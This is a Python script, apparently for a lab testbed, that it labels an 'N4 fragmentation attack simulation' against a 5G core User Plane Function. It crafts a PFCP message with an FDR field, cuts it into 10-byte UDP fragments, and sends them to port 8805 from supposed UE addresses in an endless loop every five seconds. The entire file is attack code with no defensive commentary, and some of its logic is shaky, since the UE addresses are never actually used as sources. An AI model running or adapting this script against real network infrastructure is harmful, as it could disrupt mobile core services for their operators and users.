import socket
import struct
import time
from threading import Thread


UPF_IP = "192.168.56.112"  
UPF_PORT = 8805  
FRAGMENT_SIZE = 10 
SEID = 0xF9

UE_IPS = ["192.168.1.101", "192.168.1.102", "192.168.1.103", "192.168.1.104", "192.168.1.105"]

def create_large_pfcp_message_with_fdr():
    version = 1  
    message_type = 50  
    sequence_number = 12345 
    seid = SEID

    fdr_type = 0x01  
    fdr_length = 16  
    fdr_value = b"FDR-PARAMETER"  

    fdr = struct.pack("!BH", fdr_type, fdr_length) + fdr_value.ljust(fdr_length, b'\x00')

    header = struct.pack(
        "!BBHI", version << 5, message_type, len(fdr) + 8, seid
    ) + struct.pack("!I", sequence_number)

    return header, fdr


def fragment_message(header, fdr, fragment_size):
    full_message = header + fdr
    fragments = [full_message[i:i + fragment_size] for i in range(0, len(full_message), fragment_size)]
    return fragments


def send_fragment(ue_ip, fragment, fragment_number):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        sock.sendto(fragment, (UPF_IP, UPF_PORT))
        print(f"[+] {ue_ip} sent fragment {fragment_number} to {UPF_IP}:{UPF_PORT}")
    except Exception as e:
        print(f"[-] Error sending fragment {fragment_number} from {ue_ip}: {e}")
    finally:
        sock.close()

def send_fragmented_pfcp_message_with_fdr():
    try:
        header, fdr = create_large_pfcp_message_with_fdr()

        fragments = fragment_message(header, fdr, FRAGMENT_SIZE)

        
        if len(fragments) > len(UE_IPS):
            print("[-] Number of fragments exceeds the number of UEs.")
            return

        print(f"[+] Sending {len(fragments)} complete fragments using {len(UE_IPS)} UEs")

        
        threads = []
        for i, fragment in enumerate(fragments):
            thread = Thread(target=send_fragment, args=(UE_IPS[i], fragment, i + 1))
            threads.append(thread)
            thread.start()

        
        for thread in threads:
            thread.join()

    except Exception as e:
        print(f"[-] Error in fragmentation process: {e}")

if __name__ == "__main__":
    print("[+] Starting N4 fragmentation attack simulation with 5 UEs...")

    while True:
        send_fragmented_pfcp_message_with_fdr()
        time.sleep(5)

